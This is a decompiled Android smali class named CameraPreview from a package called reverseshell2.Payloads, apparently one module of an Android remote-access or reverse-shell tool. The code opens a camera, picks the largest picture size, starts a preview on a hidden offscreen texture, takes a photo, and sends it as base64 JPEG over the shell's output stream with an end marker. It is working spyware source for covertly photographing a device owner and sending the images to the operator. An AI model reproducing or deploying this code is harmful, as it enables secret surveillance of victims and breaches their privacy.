.class public Lcom/example/reverseshell2/Payloads/CameraPreview;
.super Ljava/lang/Object;
.source "CameraPreview.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;

.field private out:Ljava/io/OutputStream;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "cameraPreviewClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/CameraPreview;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    :try_start_0
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->context:Landroid/content/Context;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method static synthetic access$000(Lcom/example/reverseshell2/Payloads/CameraPreview;)V
    .locals 0

    invoke-direct {p0}, Lcom/example/reverseshell2/Payloads/CameraPreview;->releaseCamera()V

    return-void
.end method

.method static synthetic access$100(Lcom/example/reverseshell2/Payloads/CameraPreview;[B)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/example/reverseshell2/Payloads/CameraPreview;->sendPhoto([B)V

    return-void
.end method

.method static synthetic access$200(Lcom/example/reverseshell2/Payloads/CameraPreview;)Ljava/io/OutputStream;
    .locals 1

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->out:Ljava/io/OutputStream;

    return-object v0
.end method

.method private releaseCamera()V
    .locals 1

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 6

    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    array-length v1, p1

    const/4 v2, 0x0

    invoke-static {p1, v2, v1}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v1

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x50

    invoke-virtual {v1, v3, v4, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    invoke-static {v3, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/example/reverseshell2/Payloads/CameraPreview$2;

    invoke-direct {v5, p0, v2}, Lcom/example/reverseshell2/Payloads/CameraPreview$2;-><init>(Lcom/example/reverseshell2/Payloads/CameraPreview;Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public startUp(ILjava/io/OutputStream;)V
    .locals 7

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->out:Ljava/io/OutputStream;

    :try_start_0
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/RuntimeException;->printStackTrace()V

    :try_start_1
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->out:Ljava/io/OutputStream;

    const-string v2, "END123\n"

    const-string v3, "UTF-8"

    invoke-virtual {v2, v3}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedPictureSizes()Ljava/util/List;

    move-result-object v1

    const/4 v2, 0x0

    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/hardware/Camera$Size;

    const/4 v4, 0x0

    :goto_1
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v5

    if-ge v4, v5, :cond_1

    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/hardware/Camera$Size;

    iget v5, v5, Landroid/hardware/Camera$Size;->width:I

    iget v6, v3, Landroid/hardware/Camera$Size;->width:I

    if-le v5, v6, :cond_0

    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    move-object v3, v5

    check-cast v3, Landroid/hardware/Camera$Size;

    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    :cond_1
    iget v4, v3, Landroid/hardware/Camera$Size;->width:I

    iget v5, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v0, v4, v5}, Landroid/hardware/Camera$Parameters;->setPictureSize(II)V

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    invoke-virtual {v4, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    :try_start_2
    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    new-instance v5, Landroid/graphics/SurfaceTexture;

    invoke-direct {v5, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v4, v5}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    :goto_2
    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/CameraPreview;->camera:Landroid/hardware/Camera;

    new-instance v4, Lcom/example/reverseshell2/Payloads/CameraPreview$1;

    invoke-direct {v4, p0}, Lcom/example/reverseshell2/Payloads/CameraPreview$1;-><init>(Lcom/example/reverseshell2/Payloads/CameraPreview;)V

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v5, v4}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    return-void
.end method
